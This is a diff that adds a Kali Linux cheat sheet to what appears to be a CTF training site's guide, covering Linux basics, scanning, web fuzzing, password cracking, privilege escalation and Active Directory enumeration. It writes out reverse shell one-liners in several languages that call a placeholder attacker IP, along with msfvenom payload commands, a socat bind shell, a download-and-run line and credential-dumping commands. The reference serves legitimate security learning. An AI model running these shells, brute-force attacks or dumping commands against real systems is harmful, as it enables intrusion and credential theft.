@@ -169,6 +169,36 @@ body { background: var(--k-bg-page); }
 .k-tip i { color: var(--k-accent); margin-top: .15rem; }
 .k-tip-text { font-size: .85rem; color: var(--k-text); line-height: 1.6; }
 
+/* ── Cheat sheet ────────────────────────── */
+.k-cheat-cat { margin-bottom: 1.5rem; }
+.k-cheat-cat-title {
+  font-size: .82rem; font-weight: 700; text-transform: uppercase; letter-spacing: 1.2px;
+  color: var(--k-accent); margin-bottom: .6rem; padding-bottom: .35rem;
+  border-bottom: 1px solid rgba(var(--k-accent-rgb),.18);
+  display: flex; align-items: center; gap: .4rem;
+}
+.k-cheat-cat-title i { font-size: .75rem; }
+.k-cheat-table { width: 100%; border-collapse: collapse; }
+.k-cheat-table th {
+  text-align: left; font-size: .68rem; font-weight: 700; text-transform: uppercase;
+  letter-spacing: .8px; color: var(--k-text-muted); padding: .4rem .6rem;
+  border-bottom: 1px solid var(--k-border); background: var(--k-bg-elevated);
+}
+.k-cheat-table td {
+  padding: .45rem .6rem; border-bottom: 1px solid rgba(var(--k-accent-rgb),.06);
+  font-size: .82rem; color: var(--k-text); vertical-align: top;
+}
+.k-cheat-table tr:hover td { background: rgba(var(--k-accent-rgb),.03); }
+.k-cheat-table td:first-child { white-space: nowrap; width: 1%; }
+.k-cheat-table code {
+  background: var(--k-bg-code); padding: .12rem .4rem; border-radius: 4px;
+  font-size: .75rem; font-family: 'SF Mono', Monaco, Consolas, monospace;
+  color: var(--k-accent); word-break: break-all; white-space: normal;
+}
+.k-cheat-table .k-desc { color: var(--k-text-muted); font-size: .78rem; }
+.k-cheat-grid { display: grid; grid-template-columns: 1fr; gap: 1.5rem; }
+@media (min-width: 768px) { .k-cheat-grid { grid-template-columns: 1fr 1fr; } }
+
 /* ── Responsive ─────────────────────────── */
 @media (max-width: 640px) {
   .k-hero-title { font-size: 1.4rem; }
@@ -199,6 +229,7 @@ body { background: var(--k-bg-page); }
       <li><a href="#first-steps"><i class="fas fa-shoe-prints"></i> First Steps</a></li>
       <li><a href="#essential-tools"><i class="fas fa-toolbox"></i> Essential Tools</a></li>
       <li><a href="#ctf-tips"><i class="fas fa-flag"></i> CTF Tips</a></li>
+      <li><a href="#cheat-sheet"><i class="fas fa-scroll"></i> Cheat Sheet</a></li>
     </ul>
   </nav>
 
@@ -609,6 +640,517 @@ body { background: var(--k-bg-page); }
     <div class="k-tip">
       <i class="fas fa-graduation-cap"></i>
       <div class="k-tip-text"><strong>Want to practice?</strong> Head to the <a href="/community" style="color:var(--k-accent);font-weight:600;">Community Challenges</a> section to try challenges created by other members, or visit <a href="/challenges" style="color:var(--k-accent);font-weight:600;">Challenges</a> to attempt the official ones!</div>
+    </div>
+  </section>
+
+  <!-- ─── Cheat Sheet ──────────────────────── -->
+  <section id="cheat-sheet" class="k-section">
+    <h2 class="k-section-title"><i class="fas fa-scroll"></i> Kali Linux Cheat Sheet</h2>
+
+    <div class="k-card" style="margin-bottom:1.5rem;">
+      <p>A comprehensive quick-reference for the commands and techniques you'll use most often in CTFs and penetration testing. Bookmark this page — it covers everything from basic Linux navigation to advanced exploitation one-liners.</p>
+    </div>
+
+    <!-- ═══ Linux Fundamentals ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fab fa-linux"></i> Linux Fundamentals</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>pwd</code></td><td class="k-desc">Print current working directory</td></tr>
+            <tr><td><code>ls -la</code></td><td class="k-desc">List all files including hidden, with permissions</td></tr>
+            <tr><td><code>cd /path/to/dir</code></td><td class="k-desc">Change directory</td></tr>
+            <tr><td><code>cp -r src dst</code></td><td class="k-desc">Copy files/directories recursively</td></tr>
+            <tr><td><code>mv old new</code></td><td class="k-desc">Move or rename files</td></tr>
+            <tr><td><code>rm -rf dir/</code></td><td class="k-desc">Remove directory and contents recursively</td></tr>
+            <tr><td><code>mkdir -p a/b/c</code></td><td class="k-desc">Create nested directories</td></tr>
+            <tr><td><code>find / -name "*.txt" 2>/dev/null</code></td><td class="k-desc">Find files by name, suppress errors</td></tr>
+            <tr><td><code>find / -perm -4000 2>/dev/null</code></td><td class="k-desc">Find SUID binaries (privesc)</td></tr>
+            <tr><td><code>locate filename</code></td><td class="k-desc">Fast file search using database (run <code>updatedb</code> first)</td></tr>
+            <tr><td><code>which nmap</code></td><td class="k-desc">Show full path of a command</td></tr>
+            <tr><td><code>cat file.txt</code></td><td class="k-desc">Display file contents</td></tr>
+            <tr><td><code>head -n 20 file</code></td><td class="k-desc">Show first 20 lines</td></tr>
+            <tr><td><code>tail -f /var/log/syslog</code></td><td class="k-desc">Follow log output in real-time</td></tr>
+            <tr><td><code>less file.txt</code></td><td class="k-desc">Paginated file viewer (q to quit)</td></tr>
+            <tr><td><code>grep -rni "password" .</code></td><td class="k-desc">Recursive case-insensitive search with line numbers</td></tr>
+            <tr><td><code>grep -E "user|pass|token" file</code></td><td class="k-desc">Search for multiple patterns (regex)</td></tr>
+            <tr><td><code>sort file | uniq -c | sort -rn</code></td><td class="k-desc">Count unique lines, sorted by frequency</td></tr>
+            <tr><td><code>wc -l file.txt</code></td><td class="k-desc">Count lines in a file</td></tr>
+            <tr><td><code>diff file1 file2</code></td><td class="k-desc">Compare two files line by line</td></tr>
+            <tr><td><code>awk '{print $1}' file</code></td><td class="k-desc">Print first column of each line</td></tr>
+            <tr><td><code>sed 's/old/new/g' file</code></td><td class="k-desc">Find and replace text in file</td></tr>
+            <tr><td><code>cut -d':' -f1 /etc/passwd</code></td><td class="k-desc">Extract first field (usernames)</td></tr>
+            <tr><td><code>tr 'A-Z' 'a-z' < file</code></td><td class="k-desc">Convert uppercase to lowercase</td></tr>
+            <tr><td><code>xargs -I{} command {}</code></td><td class="k-desc">Pass stdin as arguments to command</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Permissions & Users ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-user-shield"></i> Permissions &amp; Users</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>chmod 755 file</code></td><td class="k-desc">Set rwxr-xr-x permissions</td></tr>
+            <tr><td><code>chmod +x script.sh</code></td><td class="k-desc">Make file executable</td></tr>
+            <tr><td><code>chmod u+s binary</code></td><td class="k-desc">Set SUID bit on binary</td></tr>
+            <tr><td><code>chown user:group file</code></td><td class="k-desc">Change file owner and group</td></tr>
+            <tr><td><code>whoami</code></td><td class="k-desc">Current username</td></tr>
+            <tr><td><code>id</code></td><td class="k-desc">Show UID, GID, and group memberships</td></tr>
+            <tr><td><code>sudo -l</code></td><td class="k-desc">List commands current user can sudo (privesc check)</td></tr>
+            <tr><td><code>cat /etc/passwd</code></td><td class="k-desc">List all system users</td></tr>
+            <tr><td><code>cat /etc/shadow</code></td><td class="k-desc">Password hashes (requires root)</td></tr>
+            <tr><td><code>cat /etc/group</code></td><td class="k-desc">List all groups</td></tr>
+            <tr><td><code>getent passwd</code></td><td class="k-desc">List users (including LDAP/NIS)</td></tr>
+            <tr><td><code>w</code></td><td class="k-desc">Show who is logged in and what they're doing</td></tr>
+            <tr><td><code>last</code></td><td class="k-desc">Show last logins</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Networking ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-network-wired"></i> Networking</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>ip a</code></td><td class="k-desc">Show all network interfaces and IPs</td></tr>
+            <tr><td><code>ip route</code></td><td class="k-desc">Show routing table</td></tr>
+            <tr><td><code>ss -tulnp</code></td><td class="k-desc">Show listening ports with process info</td></tr>
+            <tr><td><code>netstat -antup</code></td><td class="k-desc">Active connections with PIDs</td></tr>
+            <tr><td><code>ping -c 3 target</code></td><td class="k-desc">Send 3 ICMP echo requests</td></tr>
+            <tr><td><code>traceroute target</code></td><td class="k-desc">Trace packet route to target</td></tr>
+            <tr><td><code>dig example.com ANY</code></td><td class="k-desc">DNS lookup — all record types</td></tr>
+            <tr><td><code>dig @ns axfr example.com</code></td><td class="k-desc">Attempt DNS zone transfer</td></tr>
+            <tr><td><code>host -t mx example.com</code></td><td class="k-desc">Lookup MX records</td></tr>
+            <tr><td><code>whois example.com</code></td><td class="k-desc">WHOIS registration lookup</td></tr>
+            <tr><td><code>curl -sv https://target</code></td><td class="k-desc">HTTP request with verbose headers</td></tr>
+            <tr><td><code>curl -X POST -d 'data' url</code></td><td class="k-desc">Send POST request with data</td></tr>
+            <tr><td><code>wget -r -np http://target/dir/</code></td><td class="k-desc">Recursively download directory</td></tr>
+            <tr><td><code>nc -lvnp 4444</code></td><td class="k-desc">Start netcat listener on port 4444</td></tr>
+            <tr><td><code>nc target 80</code></td><td class="k-desc">Connect to target on port 80</td></tr>
+            <tr><td><code>socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash</code></td><td class="k-desc">Bind shell with socat</td></tr>
+            <tr><td><code>arp-scan -l</code></td><td class="k-desc">Discover hosts on local network</td></tr>
+            <tr><td><code>tcpdump -i eth0 -w capture.pcap</code></td><td class="k-desc">Capture network traffic to file</td></tr>
+            <tr><td><code>ssh -L 8080:127.0.0.1:80 user@target</code></td><td class="k-desc">Local port forward (tunnel)</td></tr>
+            <tr><td><code>ssh -D 9050 user@target</code></td><td class="k-desc">Dynamic SOCKS proxy via SSH</td></tr>
+            <tr><td><code>sshuttle -r user@target 10.10.10.0/24</code></td><td class="k-desc">VPN-like tunnel through SSH</td></tr>
+            <tr><td><code>proxychains nmap target</code></td><td class="k-desc">Run nmap through proxy chain</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Nmap ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-radar"></i> Nmap Scanning</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>nmap -sn 10.10.10.0/24</code></td><td class="k-desc">Ping sweep — discover live hosts</td></tr>
+            <tr><td><code>nmap -sC -sV -oA scan target</code></td><td class="k-desc">Default scripts + version detection, save all formats</td></tr>
+            <tr><td><code>nmap -p- target</code></td><td class="k-desc">Scan all 65535 TCP ports</td></tr>
+            <tr><td><code>nmap -sU -top-ports 100 target</code></td><td class="k-desc">UDP scan — top 100 ports</td></tr>
+            <tr><td><code>nmap -sS -T4 -Pn target</code></td><td class="k-desc">SYN stealth scan, fast, skip ping</td></tr>
+            <tr><td><code>nmap -O target</code></td><td class="k-desc">OS detection</td></tr>
+            <tr><td><code>nmap --script vuln target</code></td><td class="k-desc">Run all vulnerability detection scripts</td></tr>
+            <tr><td><code>nmap --script smb-enum-shares target</code></td><td class="k-desc">Enumerate SMB shares</td></tr>
+            <tr><td><code>nmap --script http-enum target</code></td><td class="k-desc">Enumerate web directories/files</td></tr>
+            <tr><td><code>nmap -sV --script=banner target</code></td><td class="k-desc">Grab service banners</td></tr>
+            <tr><td><code>nmap -p 445 --script smb-vuln* target</code></td><td class="k-desc">Check for SMB vulnerabilities (EternalBlue, etc.)</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Web Application Testing ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-globe"></i> Web Application Testing</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</code></td><td class="k-desc">Directory brute-force with file extensions</td></tr>
+            <tr><td><code>gobuster dns -d target.com -w subdomains.txt</code></td><td class="k-desc">Subdomain brute-force</td></tr>
+            <tr><td><code>gobuster vhost -u http://target -w vhosts.txt</code></td><td class="k-desc">Virtual host discovery</td></tr>
+            <tr><td><code>ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301</code></td><td class="k-desc">Fast web fuzzer with status code filter</td></tr>
+            <tr><td><code>ffuf -u http://target -H "Host: FUZZ.target" -w subs.txt -fs 0</code></td><td class="k-desc">Subdomain fuzzing via Host header</td></tr>
+            <tr><td><code>feroxbuster -u http://target -w wordlist.txt -x php -d 2</code></td><td class="k-desc">Recursive directory brute-force (depth 2)</td></tr>
+            <tr><td><code>dirb http://target /usr/share/dirb/wordlists/big.txt</code></td><td class="k-desc">Classic directory scanner</td></tr>
+            <tr><td><code>wfuzz -c -z file,wordlist.txt --hc 404 http://target/FUZZ</code></td><td class="k-desc">Web fuzzer with 404 filtering</td></tr>
+            <tr><td><code>nikto -h http://target -o report.html -Format html</code></td><td class="k-desc">Web server scan with HTML report</td></tr>
+            <tr><td><code>whatweb http://target</code></td><td class="k-desc">Identify web technologies, CMS, frameworks</td></tr>
+            <tr><td><code>wafw00f http://target</code></td><td class="k-desc">Detect Web Application Firewall (WAF)</td></tr>
+            <tr><td><code>sqlmap -u "http://target/page?id=1" --dbs --batch</code></td><td class="k-desc">Auto SQL injection — enumerate databases</td></tr>
+            <tr><td><code>sqlmap -u "url" -D dbname --tables</code></td><td class="k-desc">List tables in a database</td></tr>
+            <tr><td><code>sqlmap -u "url" -D db -T table --dump</code></td><td class="k-desc">Dump table contents</td></tr>
+            <tr><td><code>sqlmap -u "url" --os-shell</code></td><td class="k-desc">Attempt OS shell via SQL injection</td></tr>
+            <tr><td><code>sqlmap -r request.txt --batch</code></td><td class="k-desc">SQL injection from saved Burp request</td></tr>
+            <tr><td><code>commix -u "http://target/page?cmd=test"</code></td><td class="k-desc">Automated command injection testing</td></tr>
+            <tr><td><code>xsser -u "http://target/search?q=test"</code></td><td class="k-desc">Automated XSS detection</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Password Attacks ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-key"></i> Password Attacks</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>john --wordlist=rockyou.txt hash.txt</code></td><td class="k-desc">Crack hashes with John + wordlist</td></tr>
+            <tr><td><code>john --show hash.txt</code></td><td class="k-desc">Show cracked passwords</td></tr>
+            <tr><td><code>john --format=raw-md5 hash.txt</code></td><td class="k-desc">Specify hash format explicitly</td></tr>
+            <tr><td><code>unshadow passwd shadow > unshadowed.txt</code></td><td class="k-desc">Combine passwd + shadow for John</td></tr>
+            <tr><td><code>hashcat -m 0 hash.txt rockyou.txt</code></td><td class="k-desc">MD5 — mode 0</td></tr>
+            <tr><td><code>hashcat -m 100 hash.txt rockyou.txt</code></td><td class="k-desc">SHA1 — mode 100</td></tr>
+            <tr><td><code>hashcat -m 1000 hash.txt rockyou.txt</code></td><td class="k-desc">NTLM — mode 1000</td></tr>
+            <tr><td><code>hashcat -m 1800 hash.txt rockyou.txt</code></td><td class="k-desc">sha512crypt ($6$) — mode 1800</td></tr>
+            <tr><td><code>hashcat -m 3200 hash.txt rockyou.txt</code></td><td class="k-desc">bcrypt — mode 3200</td></tr>
+            <tr><td><code>hashcat -m 13100 hash.txt rockyou.txt</code></td><td class="k-desc">Kerberoast (TGS-REP) — mode 13100</td></tr>
+            <tr><td><code>hashcat -m 5600 hash.txt rockyou.txt</code></td><td class="k-desc">NTLMv2 — mode 5600</td></tr>
+            <tr><td><code>hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a</code></td><td class="k-desc">Brute-force mask attack (6 chars)</td></tr>
+            <tr><td><code>hydra -l admin -P rockyou.txt ssh://target</code></td><td class="k-desc">Brute-force SSH login</td></tr>
+            <tr><td><code>hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"</code></td><td class="k-desc">Brute-force web login form</td></tr>
+            <tr><td><code>hydra -L users.txt -P pass.txt ftp://target</code></td><td class="k-desc">FTP brute-force with user + pass lists</td></tr>
+            <tr><td><code>hydra -l admin -P rockyou.txt rdp://target</code></td><td class="k-desc">RDP brute-force</td></tr>
+            <tr><td><code>hydra -l sa -P rockyou.txt target mssql</code></td><td class="k-desc">MSSQL brute-force</td></tr>
+            <tr><td><code>cewl http://target -d 3 -w custom_wordlist.txt</code></td><td class="k-desc">Generate wordlist from website content</td></tr>
+            <tr><td><code>crunch 6 8 abc123 -o wordlist.txt</code></td><td class="k-desc">Generate custom wordlist (6-8 chars)</td></tr>
+            <tr><td><code>hash-identifier</code></td><td class="k-desc">Identify hash type interactively</td></tr>
+            <tr><td><code>hashid hash_value</code></td><td class="k-desc">Identify hash type from value</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Reverse Shells ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-terminal"></i> Reverse Shells &amp; Payloads</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Shell / Payload</th><th>Command</th></tr></thead>
+          <tbody>
+            <tr><td class="k-desc"><strong>Bash</strong></td><td><code>bash -i >& /dev/tcp/YOURIP/4444 0>&1</code></td></tr>
+            <tr><td class="k-desc"><strong>Python</strong></td><td><code>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOURIP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></td></tr>
+            <tr><td class="k-desc"><strong>PHP</strong></td><td><code>php -r '$sock=fsockopen("YOURIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code></td></tr>
+            <tr><td class="k-desc"><strong>Netcat (traditional)</strong></td><td><code>nc -e /bin/bash YOURIP 4444</code></td></tr>
+            <tr><td class="k-desc"><strong>Netcat (no -e)</strong></td><td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP 4444 >/tmp/f</code></td></tr>
+            <tr><td class="k-desc"><strong>Perl</strong></td><td><code>perl -e 'use Socket;$i="YOURIP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'</code></td></tr>
+            <tr><td class="k-desc"><strong>Ruby</strong></td><td><code>ruby -rsocket -e'f=TCPSocket.open("YOURIP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code></td></tr>
+            <tr><td class="k-desc"><strong>PowerShell</strong></td><td><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('YOURIP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"</code></td></tr>
+            <tr><td class="k-desc"><strong>Upgrade to TTY</strong></td><td><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> then <code>Ctrl+Z</code> → <code>stty raw -echo;fg</code> → <code>export TERM=xterm</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ MSFvenom Payloads ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-bomb"></i> MSFvenom Payloads</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Target</th><th>Command</th></tr></thead>
+          <tbody>
+            <tr><td class="k-desc"><strong>Linux ELF</strong></td><td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f elf -o rev.elf</code></td></tr>
+            <tr><td class="k-desc"><strong>Linux Meterpreter</strong></td><td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f elf -o met.elf</code></td></tr>
+            <tr><td class="k-desc"><strong>Windows EXE</strong></td><td><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f exe -o rev.exe</code></td></tr>
+            <tr><td class="k-desc"><strong>Windows Meterpreter</strong></td><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f exe -o met.exe</code></td></tr>
+            <tr><td class="k-desc"><strong>PHP</strong></td><td><code>msfvenom -p php/reverse_php LHOST=YOURIP LPORT=4444 -f raw -o shell.php</code></td></tr>
+            <tr><td class="k-desc"><strong>JSP</strong></td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f raw -o shell.jsp</code></td></tr>
+            <tr><td class="k-desc"><strong>WAR</strong></td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f war -o shell.war</code></td></tr>
+            <tr><td class="k-desc"><strong>Python</strong></td><td><code>msfvenom -p cmd/unix/reverse_python LHOST=YOURIP LPORT=4444 -f raw</code></td></tr>
+            <tr><td class="k-desc"><strong>ASP</strong></td><td><code>msfvenom -p windows/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f asp -o shell.asp</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Metasploit ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-crosshairs"></i> Metasploit Framework</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>msfconsole</code></td><td class="k-desc">Launch Metasploit</td></tr>
+            <tr><td><code>search type:exploit name:smb</code></td><td class="k-desc">Search for SMB exploits</td></tr>
+            <tr><td><code>use exploit/windows/smb/ms17_010_eternalblue</code></td><td class="k-desc">Select a module</td></tr>
+            <tr><td><code>show options</code></td><td class="k-desc">Display required/optional settings</td></tr>
+            <tr><td><code>set RHOSTS target</code></td><td class="k-desc">Set target host</td></tr>
+            <tr><td><code>set LHOST yourip</code></td><td class="k-desc">Set listener IP</td></tr>
+            <tr><td><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></td><td class="k-desc">Set payload</td></tr>
+            <tr><td><code>exploit / run</code></td><td class="k-desc">Execute the exploit</td></tr>
+            <tr><td><code>sessions -l</code></td><td class="k-desc">List active sessions</td></tr>
+            <tr><td><code>sessions -i 1</code></td><td class="k-desc">Interact with session 1</td></tr>
+            <tr><td><code>background</code></td><td class="k-desc">Background current session</td></tr>
+            <tr><td><code>use post/multi/recon/local_exploit_suggester</code></td><td class="k-desc">Suggest local privilege escalation exploits</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Linux Privilege Escalation ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-arrow-up"></i> Linux Privilege Escalation</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>sudo -l</code></td><td class="k-desc">Check sudo permissions (first thing to check!)</td></tr>
+            <tr><td><code>find / -perm -4000 2>/dev/null</code></td><td class="k-desc">Find SUID binaries</td></tr>
+            <tr><td><code>find / -perm -2000 2>/dev/null</code></td><td class="k-desc">Find SGID binaries</td></tr>
+            <tr><td><code>find / -writable 2>/dev/null | grep -v proc</code></td><td class="k-desc">Find world-writable files</td></tr>
+            <tr><td><code>getcap -r / 2>/dev/null</code></td><td class="k-desc">Find binaries with capabilities</td></tr>
+            <tr><td><code>cat /etc/crontab</code></td><td class="k-desc">Check cron jobs</td></tr>
+            <tr><td><code>ls -la /etc/cron*</code></td><td class="k-desc">List all cron directories</td></tr>
+            <tr><td><code>systemctl list-timers</code></td><td class="k-desc">List active systemd timers</td></tr>
+            <tr><td><code>cat /etc/exports</code></td><td class="k-desc">Check NFS shares (no_root_squash → root)</td></tr>
+            <tr><td><code>env</code></td><td class="k-desc">Check environment variables for secrets</td></tr>
+            <tr><td><code>cat /proc/version</code></td><td class="k-desc">Kernel version (check for kernel exploits)</td></tr>
+            <tr><td><code>uname -a</code></td><td class="k-desc">System info — kernel, architecture</td></tr>
+            <tr><td><code>ls -la /home/</code></td><td class="k-desc">Check other users' home directories</td></tr>
+            <tr><td><code>history</code></td><td class="k-desc">Check command history for credentials</td></tr>
+            <tr><td><code>cat ~/.bash_history</code></td><td class="k-desc">Read bash history file</td></tr>
+            <tr><td><code>find / -name "*.bak" -o -name "*.old" -o -name "*.conf" 2>/dev/null</code></td><td class="k-desc">Find config/backup files</td></tr>
+            <tr><td><code>ls -la /opt/ /var/backups/ /tmp/</code></td><td class="k-desc">Check common directories for interesting files</td></tr>
+            <tr><td><code>wget http://YOURIP/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh</code></td><td class="k-desc">Download and run LinPEAS (automated privesc scanner)</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Windows Privilege Escalation ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fab fa-windows"></i> Windows Privilege Escalation</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>whoami /all</code></td><td class="k-desc">Current user, groups, privileges</td></tr>
+            <tr><td><code>systeminfo</code></td><td class="k-desc">OS version, hotfixes, architecture</td></tr>
+            <tr><td><code>net user</code></td><td class="k-desc">List local users</td></tr>
+            <tr><td><code>net localgroup administrators</code></td><td class="k-desc">List admin group members</td></tr>
+            <tr><td><code>cmdkey /list</code></td><td class="k-desc">Stored credentials</td></tr>
+            <tr><td><code>reg query HKLM /f password /t REG_SZ /s</code></td><td class="k-desc">Search registry for passwords</td></tr>
+            <tr><td><code>schtasks /query /fo LIST /v</code></td><td class="k-desc">List scheduled tasks (verbose)</td></tr>
+            <tr><td><code>wmic service list brief</code></td><td class="k-desc">List services</td></tr>
+            <tr><td><code>sc qc ServiceName</code></td><td class="k-desc">Query service config (unquoted paths?)</td></tr>
+            <tr><td><code>icacls "C:\path\to\service.exe"</code></td><td class="k-desc">Check file permissions</td></tr>
+            <tr><td><code>netstat -ano</code></td><td class="k-desc">Active connections with PIDs</td></tr>
+            <tr><td><code>dir /s /b C:\*.txt C:\*.ini C:\*.cfg 2>nul</code></td><td class="k-desc">Search for config files</td></tr>
+            <tr><td><code>type C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></td><td class="k-desc">PowerShell history</td></tr>
+            <tr><td><code>winPEASx64.exe</code></td><td class="k-desc">Automated Windows privesc scanner</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ SMB / Active Directory ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-server"></i> SMB &amp; Active Directory</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>smbclient -L //target -N</code></td><td class="k-desc">List SMB shares (null session)</td></tr>
+            <tr><td><code>smbclient //target/share -U user</code></td><td class="k-desc">Connect to SMB share</td></tr>
+            <tr><td><code>smbmap -H target</code></td><td class="k-desc">Enumerate share permissions</td></tr>
+            <tr><td><code>smbmap -H target -u user -p pass -r share</code></td><td class="k-desc">Recursively list share contents</td></tr>
+            <tr><td><code>crackmapexec smb target -u user -p pass</code></td><td class="k-desc">Validate credentials against SMB</td></tr>
+            <tr><td><code>crackmapexec smb target -u user -p pass --shares</code></td><td class="k-desc">List shares with credentials</td></tr>
+            <tr><td><code>crackmapexec smb target -u user -p pass -M spider_plus</code></td><td class="k-desc">Spider all shares for files</td></tr>
+            <tr><td><code>enum4linux -a target</code></td><td class="k-desc">Full SMB/RPC enumeration</td></tr>
+            <tr><td><code>rpcclient -U '' -N target</code></td><td class="k-desc">Null session RPC connection</td></tr>
+            <tr><td><code>impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC</code></td><td class="k-desc">AS-REP Roast — get hashes without pre-auth</td></tr>
+            <tr><td><code>impacket-GetUserSPNs domain/user:pass -dc-ip DC -request</code></td><td class="k-desc">Kerberoast — request TGS tickets</td></tr>
+            <tr><td><code>impacket-secretsdump domain/user:pass@target</code></td><td class="k-desc">Dump SAM / NTDS.dit hashes</td></tr>
+            <tr><td><code>impacket-psexec domain/user:pass@target</code></td><td class="k-desc">Remote shell via SMB (admin required)</td></tr>
+            <tr><td><code>impacket-wmiexec domain/user:pass@target</code></td><td class="k-desc">Remote shell via WMI</td></tr>
+            <tr><td><code>evil-winrm -i target -u user -p pass</code></td><td class="k-desc">WinRM shell (port 5985)</td></tr>
